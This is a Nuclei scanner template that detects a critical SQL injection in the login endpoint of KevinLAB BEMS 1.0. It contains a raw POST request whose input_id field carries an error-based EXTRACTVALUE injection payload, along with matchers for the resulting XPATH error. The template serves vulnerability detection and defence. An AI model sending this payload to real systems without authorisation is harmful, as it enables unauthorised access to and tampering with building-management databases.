id: kevinlab-bems-sqli
info:
  name: KevinLAB BEMS 1.0 - SQL Injection
  author: gy741
  severity: critical
  description: KevinLAB BEMS 1.0 contains a SQL injection vulnerability that allows
    attackers to obtain sensitive information from a database, modify data, and execute
    unauthorized administrative operations in the context of the affected site.
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5655.php
  - https://www.exploit-db.com/exploits/50146
  - https://packetstormsecurity.com/files/163572/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: kevinlab,sqli,edb,packetstorm
  metadata:
    impact: The SQL injection vulnerability in KevinLAB BEMS 1.0 can allow an attacker
      to access sensitive information, modify data, and execute unauthorized administrative
      operations on the affected website.
    recommendation: It is recommended that users of KevinLAB BEMS 1.0 immediately
      update their software to address the SQL injection vulnerability and prevent
      sensitive data from being compromised.
requests:
- raw:
  - 'POST /http/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Accept-Encoding: gzip, deflate


    requester=login&request=login&params=[{"name":"input_id","value":"USERNAME'' AND
    EXTRACTVALUE(1337,CONCAT(0x5C,0x5A534C,(SELECT (ELT(1337=1337,1))),0x5A534C))
    AND ''joxy''=''joxy"},{"name":"input_passwd","value":"PASSWORD"},{"name":"device_id","value":"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"},{"name":"checked","value":false},{"name":"login_key","value":""}]

    '
  matchers-condition: and
  matchers:
  - type: word
    words:
    - XPATH syntax error
    - ': ''\ZSL1ZSL'''
    condition: and
  - type: status
    status:
    - 200
